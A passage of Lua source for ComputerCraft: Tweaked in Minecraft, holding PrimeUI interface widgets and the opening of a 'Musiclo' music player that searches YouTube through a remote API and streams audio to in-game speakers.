                    -- Trigger the action.
                    if type(action) == ""string"" then
                        PrimeUI.resolve(""clickRegion"", action)
                    else
                        action()
                    end
                end
            end
        end
    end)
end

--- Draws a NFT-formatted image to the screen.
---@param win window The window to draw on
---@param x number The X position of the top left corner of the image
---@param y number The Y position of the top left corner of the image
---@param data string|table The path to the image to load, or the image data itself
function PrimeUI.drawNFT(win, x, y, data)
    expect(1, win, ""table"")
    expect(2, x, ""number"")
    expect(3, y, ""number"")
    expect(4, data, ""string"", ""table"")
    -- Load the image file if a string was passed using nft.load.
    if type(data) == ""string"" then
        data = assert(nft.load(""data/example.nft""), ""File is not a valid NFT file"")
    end
    nft.draw(data, x, y , win)
end

--- Draws a block of text inside a window with word wrapping, optionally resizing the window to fit.
---@param win window The window to draw in
---@param text string The text to draw
---@param resizeToFit boolean|nil Whether to resize the window to fit the text (defaults to false). This is useful for scroll boxes.
---@param fgColor color|nil The color of the text (defaults to white)
---@param bgColor color|nil The color of the background (defaults to black)
---@return number lines The total number of lines drawn
function PrimeUI.drawText(win, text, resizeToFit, fgColor, bgColor)
    expect(1, win, ""table"")
    expect(2, text, ""string"")
    expect(3, resizeToFit, ""boolean"", ""nil"")
    fgColor = expect(4, fgColor, ""number"", ""nil"") or colors.white
    bgColor = expect(5, bgColor, ""number"", ""nil"") or colors.black
    -- Set colors.
    win.setBackgroundColor(bgColor)
    win.setTextColor(fgColor)
    -- Redirect to the window to use print on it.
    local old = term.redirect(win)
    -- Draw the text using print().
    local lines = print(text)
    -- Redirect back to the original terminal.
    term.redirect(old)
    -- Resize the window if desired.
    if resizeToFit then
        -- Get original parameters.
        local x, y = win.getPosition()
        local w = win.getSize()
        -- Resize the window.
        win.reposition(x, y, w, lines)
    end
    return lines
end

--- Draws a horizontal line at a position with the specified width.
---@param win window The window to draw on
---@param x number The X position of the left side of the line
---@param y number The Y position of the line
---@param width number The width/length of the line
---@param fgColor color|nil The color of the line (defaults to white)
---@param bgColor color|nil The color of the background (defaults to black)
function PrimeUI.horizontalLine(win, x, y, width, fgColor, bgColor)
    expect(1, win, ""table"")
    expect(2, x, ""number"")
    expect(3, y, ""number"")
    expect(4, width, ""number"")
    fgColor = expect(5, fgColor, ""number"", ""nil"") or colors.white
    bgColor = expect(6, bgColor, ""number"", ""nil"") or colors.black
    -- Use drawing characters to draw a thin line.
    win.setCursorPos(x, y)
    win.setTextColor(fgColor)
    win.setBackgroundColor(bgColor)
    win.write((""\x8C""):rep(width))
end

--- Creates a text input box.
---@param win window The window to draw on
---@param x number The X position of the left side of the box
---@param y number The Y position of the box
---@param width number The width/length of the box
---@param action function|string A function or `run` event to call when the enter key is pressed
---@param fgColor color|nil The color of the text (defaults to white)
---@param bgColor color|nil The color of the background (defaults to black)
---@param replacement string|nil A character to replace typed characters with
---@param history string[]|nil A list of previous entries to provide
---@param completion function|nil A function to call to provide completion
---@param default string|nil A string to return if the box is empty
function PrimeUI.inputBox(win, x, y, width, action, fgColor, bgColor, replacement, history, completion, default)
    expect(1, win, ""table"")
    expect(2, x, ""number"")
    expect(3, y, ""number"")
    expect(4, width, ""number"")
    expect(5, action, ""function"", ""string"")
    fgColor = expect(6, fgColor, ""number"", ""nil"") or colors.white
    bgColor = expect(7, bgColor, ""number"", ""nil"") or colors.black
    expect(8, replacement, ""string"", ""nil"")
    expect(9, history, ""table"", ""nil"")
    expect(10, completion, ""function"", ""nil"")
    expect(11, default, ""string"", ""nil"")
    -- Create a window to draw the input in.
    local box = window.create(win, x, y, width, 1)
    box.setTextColor(fgColor)
    box.setBackgroundColor(bgColor)
    box.clear()
    -- Call read() in a new coroutine.
    PrimeUI.addTask(function()
        -- We need a child coroutine to be able to redirect back to the window.
        local coro = coroutine.create(read)
        -- Run the function for the first time, redirecting to the window.
        local old = term.redirect(box)
        local ok, res = coroutine.resume(coro, replacement, history, completion, default)
        term.redirect(old)
        -- Run the coroutine until it finishes.
        while coroutine.status(coro) ~= ""dead"" do
            -- Get the next event.
            local ev = table.pack(os.pullEvent())
            -- Redirect and resume.
            old = term.redirect(box)
            ok, res = coroutine.resume(coro, table.unpack(ev, 1, ev.n))
            term.redirect(old)
            -- Pass any errors along.
            if not ok then error(res) end
        end
        -- Send the result to the receiver.
        if type(action) == ""string"" then PrimeUI.resolve(""inputBox"", action, res)
        else action(res) end
        -- Spin forever, because tasks cannot exit.
        while true do os.pullEvent() end
    end)
end

--- Runs a function or action repeatedly after a specified time period until canceled.
--- If a function is passed as an action, it may return a number to change the
--- period, or `false` to stop it.
---@param time number The amount of time to wait for each time, in seconds
---@param action function|string The function to call when the timer completes, or a `run` event to send
---@return function cancel A function to cancel the timer
function PrimeUI.interval(time, action)
    expect(1, time, ""number"")
    expect(2, action, ""function"", ""string"")
    -- Start the timer.
    local timer = os.startTimer(time)
    -- Add a task to wait for the timer.
    PrimeUI.addTask(function()
        while true do
            -- Wait for a timer event.
            local _, tm = os.pullEvent(""timer"")
            if tm == timer then
                -- Fire the timer action.
                local res
                if type(action) == ""string"" then PrimeUI.resolve(""timeout"", action)
                else res = action() end
                -- Check the return value and adjust time accordingly.
                if type(res) == ""number"" then time = res end
                -- Set a new timer if not canceled.
                if res ~= false then timer = os.startTimer(time) end
            end
        end
    end)
    -- Return a function to cancel the timer.
    return function() os.cancelTimer(timer) end
end

--- Adds an action to trigger when a key is pressed.
---@param key key The key to trigger on, from `keys.*`
---@param action function|string A function to call when clicked, or a string to use as a key for a `run` return event
function PrimeUI.keyAction(key, action)
    expect(1, key, ""number"")
    expect(2, action, ""function"", ""string"")
    PrimeUI.addTask(function()
        while true do
            local _, param1 = os.pullEvent(""key"") -- wait for key
            if param1 == key then
                if type(action) == ""string"" then PrimeUI.resolve(""keyAction"", action)
                else action() end
            end
        end
    end)
end

--- Draws a line of text at a position.
---@param win window The window to draw on
---@param x number The X position of the left side of the text
---@param y number The Y position of the text
---@param text string The text to draw
---@param fgColor color|nil The color of the text (defaults to white)
---@param bgColor color|nil The color of the background (defaults to black)
function PrimeUI.label(win, x, y, text, fgColor, bgColor)
    expect(1, win, ""table"")
    expect(2, x, ""number"")
    expect(3, y, ""number"")
    expect(4, text, ""string"")
    fgColor = expect(5, fgColor, ""number"", ""nil"") or colors.white
    bgColor = expect(6, bgColor, ""number"", ""nil"") or colors.black
    win.setCursorPos(x, y)
    win.setTextColor(fgColor)
    win.setBackgroundColor(bgColor)
    win.write(text)
end

--- Creates a progress bar, which can be updated by calling the returned function.
---@param win window The window to draw on
---@param x number The X position of the left side of the bar
---@param y number The Y position of the bar
---@param width number The width of the bar
---@param fgColor color|nil The color of the activated part of the bar (defaults to white)
---@param bgColor color|nil The color of the inactive part of the bar (defaults to black)
---@param useShade boolean|nil Whether to use shaded areas for the inactive part (defaults to false)
---@return function redraw A function to call to update the progress of the bar, taking a number from 0.0 to 1.0
function PrimeUI.progressBar(win, x, y, width, fgColor, bgColor, useShade)
    expect(1, win, ""table"")
    expect(2, x, ""number"")
    expect(3, y, ""number"")
    expect(4, width, ""number"")
    fgColor = expect(5, fgColor, ""number"", ""nil"") or colors.white
    bgColor = expect(6, bgColor, ""number"", ""nil"") or colors.black
    expect(7, useShade, ""boolean"", ""nil"")
    local function redraw(progress)
        expect(1, progress, ""number"")
        if progress < 0 or progress > 1 then error(""bad argument #1 (value out of range)"", 2) end
        -- Draw the active part of the bar.
        win.setCursorPos(x, y)
        win.setBackgroundColor(bgColor)
        win.setBackgroundColor(fgColor)
        win.write(("" ""):rep(math.floor(progress * width)))
        -- Draw the inactive part of the bar, using shade if desired.
        win.setBackgroundColor(bgColor)
        win.setTextColor(fgColor)
        win.write((useShade and ""\x7F"" or "" ""):rep(width - math.floor(progress * width)))
    end
    redraw(0)
    return redraw
end

--- Creates a scrollable window, which allows drawing large content in a small area.
---@param win window The parent window of the scroll box
---@param x number The X position of the box
---@param y number The Y position of the box
---@param width number The width of the box
---@param height number The height of the outer box
---@param innerHeight number The height of the inner scroll area
---@param allowArrowKeys boolean|nil Whether to allow arrow keys to scroll the box (defaults to true)
---@param showScrollIndicators boolean|nil Whether to show arrow indicators on the right side when scrolling is available, which reduces the inner width by 1 (defaults to false)
---@param fgColor number|nil The color of scroll indicators (defaults to white)
---@param bgColor color|nil The color of the background (defaults to black)
---@return window inner The inner window to draw inside
---@return fun(pos:number) scroll A function to manually set the scroll position of the window
function PrimeUI.scrollBox(win, x, y, width, height, innerHeight, allowArrowKeys, showScrollIndicators, fgColor, bgColor)
    expect(1, win, ""table"")
    expect(2, x, ""number"")
    expect(3, y, ""number"")
    expect(4, width, ""number"")
    expect(5, height, ""number"")
    expect(6, innerHeight, ""number"")
    expect(7, allowArrowKeys, ""boolean"", ""nil"")
    expect(8, showScrollIndicators, ""boolean"", ""nil"")
    fgColor = expect(9, fgColor, ""number"", ""nil"") or colors.white
    bgColor = expect(10, bgColor, ""number"", ""nil"") or colors.black
    if allowArrowKeys == nil then allowArrowKeys = true end
    -- Create the outer container box.
    local outer = window.create(win == term and term.current() or win, x, y, width, height)
    outer.setBackgroundColor(bgColor)
    outer.clear()
    -- Create the inner scrolling box.
    local inner = window.create(outer, 1, 1, width - (showScrollIndicators and 1 or 0), innerHeight)
    inner.setBackgroundColor(bgColor)
    inner.clear()
    -- Draw scroll indicators if desired.
    if showScrollIndicators then
        outer.setBackgroundColor(bgColor)
        outer.setTextColor(fgColor)
        outer.setCursorPos(width, height)
        outer.write(innerHeight > height and ""\31"" or "" "")
    end
    -- Get the absolute position of the window.
    x, y = PrimeUI.getWindowPos(win, x, y)
    -- Add the scroll handler.
    local scrollPos = 1
    
    -- Store the original event filter function
    local originalEventFilter = PrimeUI.eventFilter
    
    -- Replace the event filter to adjust mouse coordinates for buttons inside the scroll box
    PrimeUI.eventFilter = function(event, ...)
        if event == ""mouse_click"" or event == ""mouse_up"" or event == ""mouse_drag"" then
            local _, mouseX, mouseY = ...
            
            -- Check if the click is within the scroll box boundaries
            if mouseX >= x and mouseX < x + width and mouseY >= y and mouseY < y + height then
                -- Adjust the Y coordinate based on scroll position
                local adjustedY = mouseY + scrollPos - 1
                
                -- Call the original event filter with adjusted coordinates
                return originalEventFilter(event, _, mouseX, adjustedY, select(4, ...))
            end
        end
        
        -- For other events, use the original filter
        return originalEventFilter(event, ...)
    end
    
    PrimeUI.addTask(function()
        while true do
            -- Wait for next event.
            local ev = table.pack(os.pullEvent())
            -- Update inner height in case it changed.
            innerHeight = select(2, inner.getSize())
            -- Check for scroll events and set direction.
            local dir
            if ev[1] == ""key"" and allowArrowKeys then
                if ev[2] == keys.up then dir = -1
                elseif ev[2] == keys.down then dir = 1 end
            elseif ev[1] == ""mouse_scroll"" and ev[3] >= x and ev[3] < x + width and ev[4] >= y and ev[4] < y + height then
                dir = ev[2]
            end
            -- If there's a scroll event, move the window vertically.
            if dir and (scrollPos + dir >= 1 and scrollPos + dir <= innerHeight - height) then
                scrollPos = scrollPos + dir
                inner.reposition(1, 2 - scrollPos)
            end
            -- Redraw scroll indicators if desired.
            if showScrollIndicators then
                outer.setBackgroundColor(bgColor)
                outer.setTextColor(fgColor)
                outer.setCursorPos(width, 1)
                outer.write(scrollPos > 1 and ""\30"" or "" "")
                outer.setCursorPos(width, height)
                outer.write(scrollPos < innerHeight - height and ""\31"" or "" "")
            end
        end
    end)
    
    -- Make a function to allow external scrolling.
    local function scroll(pos)
        expect(1, pos, ""number"")
        pos = math.floor(pos)
        expect.range(pos, 1, innerHeight - height)
        -- Scroll the window.
        scrollPos = pos
        inner.reposition(1, 2 - scrollPos)
        -- Redraw scroll indicators if desired.
        if showScrollIndicators then
            outer.setBackgroundColor(bgColor)
            outer.setTextColor(fgColor)
            outer.setCursorPos(width, 1)
            outer.write(scrollPos > 1 and ""\30"" or "" "")
            outer.setCursorPos(width, height)
            outer.write(scrollPos < innerHeight - height and ""\31"" or "" "")
        end
    end
    
    -- Add a cleanup task to restore the original event filter when the scroll box is destroyed
    PrimeUI.addTask(function()
        while true do
            local event = os.pullEvent(""term_resize"")
            -- Check if the outer window still exists
            if not outer.isColor then
                -- Restore the original event filter
                PrimeUI.eventFilter = originalEventFilter
                return
            end
        end
    end)
    
    return inner, scroll
end

--- Creates a list of entries that can each be selected.
---@param win window The window to draw on
---@param x number The X coordinate of the inside of the box
---@param y number The Y coordinate of the inside of the box
---@param width number The width of the inner box
---@param height number The height of the inner box
---@param entries string[] A list of entries to show, where the value is whether the item is pre-selected (or `""R""` for required/forced selected)
---@param action function|string A function or `run` event that's called when a selection is made
---@param selectChangeAction function|string|nil A function or `run` event that's called when the current selection is changed
---@param fgColor color|nil The color of the text (defaults to white)
---@param bgColor color|nil The color of the background (defaults to black)
function PrimeUI.selectionBox(win, x, y, width, height, entries, action, selectChangeAction, fgColor, bgColor)
    expect(1, win, ""table"")
    expect(2, x, ""number"")
    expect(3, y, ""number"")
    expect(4, width, ""number"")
    expect(5, height, ""number"")
    expect(6, entries, ""table"")
    expect(7, action, ""function"", ""string"")
    expect(8, selectChangeAction, ""function"", ""string"", ""nil"")
    fgColor = expect(9, fgColor, ""number"", ""nil"") or colors.white
    bgColor = expect(10, bgColor, ""number"", ""nil"") or colors.black
    -- Check that all entries are strings.
    if #entries == 0 then error(""bad argument #6 (table must not be empty)"", 2) end
    for i, v in ipairs(entries) do
        if type(v) ~= ""string"" then error(""bad item "" .. i .. "" in entries table (expected string, got "" .. type(v), 2) end
    end
    -- Create container window.
    local entrywin = window.create(win, x, y, width, height)
    local selection, scroll = 1, 1
    -- Create a function to redraw the entries on screen.
    local function drawEntries()
        -- Clear and set invisible for performance.
        entrywin.setVisible(false)
        entrywin.setBackgroundColor(bgColor)
        entrywin.clear()
        -- Draw each entry in the scrolled region.
        for i = scroll, scroll + height - 1 do
            -- Get the entry; stop if there's no more.
            local e = entries[i]
            if not e then break end
            -- Set the colors: invert if selected.
            entrywin.setCursorPos(2, i - scroll + 1)
            if i == selection then
                entrywin.setBackgroundColor(fgColor)
                entrywin.setTextColor(bgColor)
            else
                entrywin.setBackgroundColor(bgColor)
                entrywin.setTextColor(fgColor)
            end
            -- Draw the selection.
            entrywin.clearLine()
            entrywin.write(#e > width - 1 and e:sub(1, width - 4) .. ""..."" or e)
        end
        -- Draw scroll arrows.
        entrywin.setBackgroundColor(bgColor)
        entrywin.setTextColor(fgColor)
        entrywin.setCursorPos(width, 1)
        entrywin.write(""\30"")
        entrywin.setCursorPos(width, height)
        entrywin.write(""\31"")
        -- Send updates to the screen.
        entrywin.setVisible(true)
    end
    -- Draw first screen.
    drawEntries()
    -- Add a task for selection keys.
    PrimeUI.addTask(function()
        while true do
            local event, key, cx, cy = os.pullEvent()
            if event == ""key"" then
                if key == keys.down and selection < #entries then
                    -- Move selection down.
                    selection = selection + 1
                    if selection > scroll + height - 1 then scroll = scroll + 1 end
                    -- Send action if necessary.
                    if type(selectChangeAction) == ""string"" then PrimeUI.resolve(""selectionBox"", selectChangeAction, selection)
                    elseif selectChangeAction then selectChangeAction(selection) end
                    -- Redraw screen.
                    drawEntries()
                elseif key == keys.up and selection > 1 then
                    -- Move selection up.
                    selection = selection - 1
                    if selection < scroll then scroll = scroll - 1 end
                    -- Send action if necessary.
                    if type(selectChangeAction) == ""string"" then PrimeUI.resolve(""selectionBox"", selectChangeAction, selection)
                    elseif selectChangeAction then selectChangeAction(selection) end
                    -- Redraw screen.
                    drawEntries()
                elseif key == keys.enter then
                    -- Select the entry: send the action.
                    if type(action) == ""string"" then PrimeUI.resolve(""selectionBox"", action, entries[selection])
                    else action(entries[selection]) end
                end
            elseif event == ""mouse_click"" and key == 1 then
                -- Handle clicking the scroll arrows.
                local wx, wy = PrimeUI.getWindowPos(entrywin, 1, 1)
                if cx == wx + width - 1 then
                    if cy == wy and selection > 1 then
                        -- Move selection up.
                        selection = selection - 1
                        if selection < scroll then scroll = scroll - 1 end
                        -- Send action if necessary.
                        if type(selectChangeAction) == ""string"" then PrimeUI.resolve(""selectionBox"", selectChangeAction, selection)
                        elseif selectChangeAction then selectChangeAction(selection) end
                        -- Redraw screen.
                        drawEntries()
                    elseif cy == wy + height - 1 and selection < #entries then
                        -- Move selection down.
                        selection = selection + 1
                        if selection > scroll + height - 1 then scroll = scroll + 1 end
                        -- Send action if necessary.
                        if type(selectChangeAction) == ""string"" then PrimeUI.resolve(""selectionBox"", selectChangeAction, selection)
                        elseif selectChangeAction then selectChangeAction(selection) end
                        -- Redraw screen.
                        drawEntries()
                    end
                elseif cx >= wx and cx < wx + width - 1 and cy >= wy and cy < wy + height then
                    local sel = scroll + (cy - wy)
                    if sel == selection then
                        -- Select the entry: send the action.
                        if type(action) == ""string"" then PrimeUI.resolve(""selectionBox"", action, entries[selection])
                        else action(entries[selection]) end
                    else
                        selection = sel
                        -- Send action if necessary.
                        if type(selectChangeAction) == ""string"" then PrimeUI.resolve(""selectionBox"", selectChangeAction, selection)
                        elseif selectChangeAction then selectChangeAction(selection) end
                        -- Redraw screen.
                        drawEntries()
                    end
                end
            elseif event == ""mouse_scroll"" then
                -- Handle mouse scrolling.
                local wx, wy = PrimeUI.getWindowPos(entrywin, 1, 1)
                if cx >= wx and cx < wx + width and cy >= wy and cy < wy + height then
                    if key < 0 and selection > 1 then
                        -- Move selection up.
                        selection = selection - 1
                        if selection < scroll then scroll = scroll - 1 end
                        -- Send action if necessary.
                        if type(selectChangeAction) == ""string"" then PrimeUI.resolve(""selectionBox"", selectChangeAction, selection)
                        elseif selectChangeAction then selectChangeAction(selection) end
                        -- Redraw screen.
                        drawEntries()
                    elseif key > 0 and selection < #entries then
                        -- Move selection down.
                        selection = selection + 1
                        if selection > scroll + height - 1 then scroll = scroll + 1 end
                        -- Send action if necessary.
                        if type(selectChangeAction) == ""string"" then PrimeUI.resolve(""selectionBox"", selectChangeAction, selection)
                        elseif selectChangeAction then selectChangeAction(selection) end
                        -- Redraw screen.
                        drawEntries()
                    end
                end
            end
        end
    end)
end

--- Creates a text box that wraps text and can have its text modified later.
---@param win window The parent window of the text box
---@param x number The X position of the box
---@param y number The Y position of the box
---@param width number The width of the box
---@param height number The height of the box
---@param text string The initial text to draw
---@param fgColor color|nil The color of the text (defaults to white)
---@param bgColor color|nil The color of the background (defaults to black)
---@return function redraw A function to redraw the window with new contents
function PrimeUI.textBox(win, x, y, width, height, text, fgColor, bgColor)
    expect(1, win, ""table"")
    expect(2, x, ""number"")
    expect(3, y, ""number"")
    expect(4, width, ""number"")
    expect(5, height, ""number"")
    expect(6, text, ""string"")
    fgColor = expect(7, fgColor, ""number"", ""nil"") or colors.white
    bgColor = expect(8, bgColor, ""number"", ""nil"") or colors.black
    -- Create the box window.
    local box = window.create(win, x, y, width, height)
    -- Override box.getSize to make print not scroll.
    function box.getSize()
        return width, math.huge
    end
    -- Define a function to redraw with.
    local function redraw(_text)
        expect(1, _text, ""string"")
        -- Set window parameters.
        box.setBackgroundColor(bgColor)
        box.setTextColor(fgColor)
        box.clear()
        box.setCursorPos(1, 1)
        -- Redirect and draw with `print`.
        local old = term.redirect(box)
        print(_text)
        term.redirect(old)
    end
    redraw(text)
    return redraw
end

--- Creates a clickable, toggleable button on screen with text.
---@param win window The window to draw on
---@param x number The X position of the button
---@param y number The Y position of the button
---@param textOn string The text to draw on the button when on
---@param textOff string The text to draw on the button when off (must be the same length as textOn)
---@param action function|string A function to call when clicked, or a string to send with a `run` event
---@param fgColor color|nil The color of the button text (defaults to white)
---@param bgColor color|nil The color of the button (defaults to light gray)
---@param clickedColor color|nil The color of the button when clicked (defaults to gray)
---@param periphName string|nil The name of the monitor peripheral, or nil (set if you're using a monitor - events will be filtered to that monitor)
function PrimeUI.toggleButton(win, x, y, textOn, textOff, action, fgColor, bgColor, clickedColor, periphName)
    expect(1, win, ""table"")
    expect(1, win, ""table"")
    expect(2, x, ""number"")
    expect(3, y, ""number"")
    expect(4, textOn, ""string"")
    expect(5, textOff, ""string"")
    if #textOn ~= #textOff then error(""On and off text must be the same length"", 2) end
    expect(6, action, ""function"", ""string"")
    fgColor = expect(7, fgColor, ""number"", ""nil"") or colors.white
    bgColor = expect(8, bgColor, ""number"", ""nil"") or colors.gray
    clickedColor = expect(9, clickedColor, ""number"", ""nil"") or colors.lightGray
    periphName = expect(10, periphName, ""string"", ""nil"")
    -- Draw the initial button.
    win.setCursorPos(x, y)
    win.setBackgroundColor(bgColor)
    win.setTextColor(fgColor)
    win.write("" "" .. textOff .. "" "")
    local state = false
    -- Get the screen position and add a click handler.
    PrimeUI.addTask(function()
        local screenX, screenY = PrimeUI.getWindowPos(win, x, y)
        local buttonDown = false
        while true do
            local event, button, clickX, clickY = os.pullEvent()
            if event == ""mouse_click"" and periphName == nil and button == 1 and clickX >= screenX and clickX < screenX + #textOn + 2 and clickY == screenY then
                -- Initiate a click action (but don't trigger until mouse up).
                buttonDown = true
                -- Redraw the button with the clicked background color.
                win.setCursorPos(x, y)
                win.setBackgroundColor(clickedColor)
                win.setTextColor(fgColor)
                win.write("" "" .. (state and textOn or textOff) .. "" "")
            elseif (event == ""monitor_touch"" and periphName == button and clickX >= screenX and clickX < screenX + #textOn + 2 and clickY == screenY)
                or (event == ""mouse_up"" and button == 1 and buttonDown) then
                -- Finish a click event.
                state = not state
                if clickX >= screenX and clickX < screenX + #textOn + 2 and clickY == screenY then
                    -- Trigger the action.
                    if type(action) == ""string"" then
                        PrimeUI.resolve(""toggleButton"", action, state)
                    else
                        action(state)
                    end
                end
                -- Redraw the original button state.
                win.setCursorPos(x, y)
                win.setBackgroundColor(bgColor)
                win.setTextColor(fgColor)
                win.write("" "" .. (state and textOn or textOff) .. "" "")
            end
        end
    end)
end

--- Draws a vertical line at a position with the specified height.
---@param win window The window to draw on
---@param x number The X position of the line
---@param y number The Y position of the top of the line
---@param height number The height of the line
---@param right boolean|nil Whether to align the line to the right instead of the left (defaults to false)
---@param fgColor color|nil The color of the line (defaults to white)
---@param bgColor color|nil The color of the background (defaults to black)
function PrimeUI.verticalLine(win, x, y, height, right, fgColor, bgColor)
    expect(1, win, ""table"")
    expect(2, x, ""number"")
    expect(3, y, ""number"")
    expect(4, height, ""number"")
    right = expect(5, right, ""boolean"", ""nil"") or false
    fgColor = expect(6, fgColor, ""number"", ""nil"") or colors.white
    bgColor = expect(7, bgColor, ""number"", ""nil"") or colors.black
    -- Use drawing characters to draw a thin line.
    win.setTextColor(right and bgColor or fgColor)
    win.setBackgroundColor(right and fgColor or bgColor)
    for j = 1, height do
        win.setCursorPos(x, y + j - 1)
        win.write(""\x95"")
    end
end
-- local ui = require ""primeui""
ui = PrimeUI

local function box(terminal, x, y, width, height, color, cornerStyle)
    cornerStyle = cornerStyle or ""square""
    terminal.setBackgroundColor(color)
    
    if cornerStyle == ""square"" then
        for i = y, y + height - 1 do
            terminal.setCursorPos(x, i)
            terminal.write(string.rep("" "", width))
        end
    elseif cornerStyle == ""round"" then
        terminal.setCursorPos(x + 1, y)
        terminal.write(string.rep("" "", width - 2))
        
        for i = y + 1, y + height - 2 do
            terminal.setCursorPos(x, i)
            terminal.write(string.rep("" "", width))
        end
        
        terminal.setCursorPos(x + 1, y + height - 1)
        terminal.write(string.rep("" "", width - 2))
    end
end
ui.box = box    

local api_base_url = ""https://ipod-2to6magyna-uc.a.run.app/""

local width, height = term.getSize()

local tab = 1
local waiting_for_input = false
local last_search = nil
local last_search_url = nil
local search_results = nil
local search_error = false
local in_fullscreen = 0
local clicked_result = nil

local playing = false
local queue = {}
local now_playing = nil
local looping = false

local playing_id = nil
local last_download_url = nil
local playing_status = 0

local player_handle = nil
local start = nil
local pcm = nil
local size = nil
local decoder = nil
local needs_next_chunk = 0
local buffer

local speakers = { peripheral.find(""speaker"") }

if #speakers == 0 then
    error(""No speakers attached. You need to connect a speaker to this computer. If this is an Advanced Noisy Pocket Computer, then this is a bug, and you should try restarting your Minecraft game."", 0)
end


local speaker = speakers[1]

os.startTimer(1)

local function playSong(song)
    now_playing = song
    playing = true
    playing_id = nil
end

local function stopPlayback()
    playing = false
    speaker.stop()
    playing_id = nil
end

local function togglePlayPause()
    if playing then
        stopPlayback()
    else
        if now_playing or #queue > 0 then
            playSong(now_playing or queue[1])
        end
    end
end

local function skipSong()
    -- Skip to next song in queue
    if #queue > 0 then
        now_playing = queue[1]
        table.remove(queue, 1)
        playing_id = nil
    else
        now_playing = nil
        playing = false
    end
end

local function toggleLoop()
    looping = not looping
end

-- Queue management functions
local function addToQueue(song, position)
    if position then
        table.insert(queue, position, song)
    else
        table.insert(queue, song)
    end
end

local function removeFromQueue(position)
    if position and position <= #queue then
        table.remove(queue, position)
    end
end

local function clearQueue()
    queue = {}
end

-- Search functions
local function searchMusic(query)
    last_search = query
    last_search_url = api_base_url .. ""?search="" .. textutils.urlEncode(query)
    http.request(last_search_url)
    search_results = nil
    search_error = false
end

local function handleAudioStream(response)
    player_handle = response
    start = response.read(4)
    size = 16 * 1024 - 4
    playing_status = 1
    decoder = require ""cc.audio.dfpwm"".make_decoder()
end

local original_palette = {}
local function initCustomPallete()
    for i=1, 16 do
        original_palette[i] = term.getPaletteColor(i)
    end

    term.setPaletteColor(colors.green, 0x1ED760)
    term.setPaletteColor(colors.lightGray, 0xb3b3b3)
    term.setPaletteColor(colors.gray, 0x212121)
    term.setPaletteColor(colors.purple, 0x457e59)
    term.setPaletteColor(colors.magenta, 0x62d089)
    term.setPaletteColor(colors.brown, 0x2e2e2e)
end

local function truncateString(str, limit)
    if not str then return """" end
    
    if #str <= limit then
        return str
    end
    
    return string.sub(str, 1, limit - 3) .. ""...""
end


ui.page = 1 

local function redrawScreen()
    ui.clear()
    ui.borderBox(term.current(), 3, 2, width-4, 1, colors.gray)

    local isSmallScreen = width <= 30
    

    if now_playing then
        if playing then
            if isSmallScreen then
                ui.button(term.current(), 4, 2, ""S"", ""pause"", colors.white, colors.red, colors.orange)
            else
                ui.button(term.current(), 4, 2, ""Stop"", ""pause"", colors.white, colors.red, colors.orange)
            end
        else
            ui.button(term.current(), 4, 2, ""\16"", ""resume"", colors.white, colors.green, colors.lightGray)
            ui.button(term.current(), 8, 2, ""R"", ""clear"", colors.white, colors.red, colors.orange)
        end
        if not isSmallScreen then
            ui.label(term.current(), 12, 2, truncateString(now_playing.name, 20), colors.white)
            ui.label(term.current(), 12+string.len(truncateString(now_playing.name, 20))+1, 2, ""| ""..truncateString(now_playing.artist, 14), colors.lightGray)
        else
            ui.label(term.current(), 8, 2, truncateString(now_playing.name, 16), colors.white)
        end
    else
        ui.label(term.current(), 4, 2, ""Musiclo"", colors.green)
        if not isSmallScreen then
            ui.label(term.current(), 4+string.len(""Musiclo"")+2, 2, ""| CC:T music player made easy"", colors.lightGray)
        else 
            ui.label(term.current(), 4+string.len(""Musiclo"")+1, 2, ""| CC:T player"", colors.lightGray)
        end
    end


    local titleTruncateLimit = 41
    local artistTruncateLimit = 26

    if isSmallScreen then
        titleTruncateLimit = 19
        artistTruncateLimit = 15
    end

    

    if ui.page == 1 then
        ui.borderBox(term.current(), 3, 5, width-4, height-6, colors.gray)

        ui.button(term.current(), width-9, 4, ""Search"", ""page.2"", colors.white, colors.magenta, colors.purple)
        ui.keyAction(keys.enter, ""page.2"")
        
        ui.label(term.current(), 4, 4, ""Queue"", colors.white)
        
        if now_playing and playing then
            ui.keyAction(keys.space, ""pause"")
        elseif now_playing then
            ui.keyAction(keys.space, ""resume"")
        end

        if looping then
            ui.button(term.current(), 4, height-1, ""Loop"", ""loop"", colors.white, colors.magenta, colors.purple)
        else
            ui.button(term.current(), 4, height-1, ""Loop"", ""loop"", colors.white, colors.gray, colors.lightGray)
        end

        if #queue > 0 then
            ui.button(term.current(), 11, height-1, ""Skip"", ""skip"", colors.white, colors.gray, colors.lightGray)
            if isSmallScreen then 
                ui.button(term.current(), 18, height-1, ""Clr"", ""clear.q"", colors.white, colors.red, colors.orange)
            else
            ui.button(term.current(), 18, height-1, ""Clear queue"", ""clear.q"", colors.white, colors.red, colors.orange)
            end
        end
        ui.label(term.current(), 4, 6, ""Now playing"", colors.white)

        local scroller = ui.scrollBox(term.current(), 3, 5, width-4, height-6, 9000, true, true)

        y = 2
        if #queue > 0 then
            for i, song in ipairs(queue) do
                ui.box(scroller, 1, y, width-5, 5, colors.brown)
                ui.label(scroller, 2, y+1, truncateString(song.name, titleTruncateLimit), colors.white, colors.brown)
                ui.label(scroller, 2, y+2, truncateString(song.artist, artistTruncateLimit), colors.lightGray, colors.brown)
                if isSmallScreen then y = y + 1 end
                ui.button(scroller, width-20, y+2, ""Play"", ""play.""..i, colors.white, colors.magenta, colors.purple)
                local songInQueue = false
                for _, queuedSong in ipairs(queue) do
                    if queuedSong.id == song.id then
                        songInQueue = true
                        break
                    end
                end
                if songInQueue then
                    ui.button(scroller, width-13, y+2, ""Remove"", ""rem.""..i, colors.white, colors.red, colors.orange)
                else
                    ui.button(scroller, width-13, y+2, ""Add"", ""add.""..i, colors.white, colors.gray, colors.lightGray)
                end
                y = y + 6
            end
        else 
            ui.centerLabel(scroller, 1, 5,width-4, ""No songs in queue"",  colors.lightGray)
            ui.button(scroller, ((width-4-3)/2-(string.len(""Add song"")/2))+1, 7 ,""Add song"", ""page.2"", colors.white, colors.gray, colors.lightGray)
        end
    elseif ui.page == 2 then
        ui.borderBox(term.current(), 3, 5, width-4, height-6, colors.gray)

        ui.button(term.current(), width-10, 4, ""Go back"",""page.1"", colors.white, colors.gray, colors.lightGray)
        ui.label(term.current(), 4, 4, ""Search"", colors.white)

        ui.label(term.current(), 4, 6, ""Search on Youtube..."", colors.lightGray)

        ui.horizontalLine(term.current(), 3, 8, width-4, colors.gray)
        
        local scroller = ui.scrollBox(term.current(), 3, 9, width-4, height-10, 9000, true, true)

        y = 2
        if search_results then
